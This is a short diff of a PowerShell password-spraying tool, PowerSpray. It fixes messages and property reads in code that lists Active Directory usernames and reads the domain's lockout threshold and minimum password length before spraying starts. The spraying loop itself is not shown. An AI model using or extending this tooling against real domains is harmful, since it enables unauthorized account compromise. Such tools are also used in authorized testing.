@@ -61,15 +61,15 @@ function PowerSpray {
     $UserList = $Searcher.FindAll().Properties.samaccountname
 
     if (([string]::IsNullOrEmpty($UserList))) {
-        Write-Host "[-] Failed to retrieve the usernames from AD; the script will exit."
+        Write-Host "[-] Failed to retrieve the usernames from Active Directory; the script will exit."
         exit
     } else {
         $UserCount = ($UserList).Count
         Write-Host "[+] Successfully collected $UserCount usernames from Active Directory."
-	$lockoutThreshold = [int]$objPDC.lockoutThreshold
-        Write-Host "[*] The Lockout Threshold for the current domain is $lockoutThreshold."
-	$minPwdLength = [int]$objPDC.minPwdLength
-        Write-Host "[*] The Min Password Length for the current domain is $minPwdLength."
+	$lockoutThreshold = [int]$objPDC.lockoutThreshold.Value
+        Write-Host "[*] The Lockout Threshold for the current domain is $($lockoutThreshold)."
+	$minPwdLength = [int]$objPDC.minPwdLength.Value
+        Write-Host "[*] The Min Password Length for the current domain is $($minPwdLength)."
     }
 
     if ($PSBoundParameters.ContainsKey('PasswordList')) {
@@ -88,7 +88,7 @@ function PowerSpray {
                 }
             }
         }
-	Write-Host "[+] Successfully generated a list of ($PasswordList).Count passwords."
+	Write-Host "[+] Successfully generated a list of $($PasswordList).Count passwords."
     }
 
     Write-Host "[*] Starting password spraying operations."
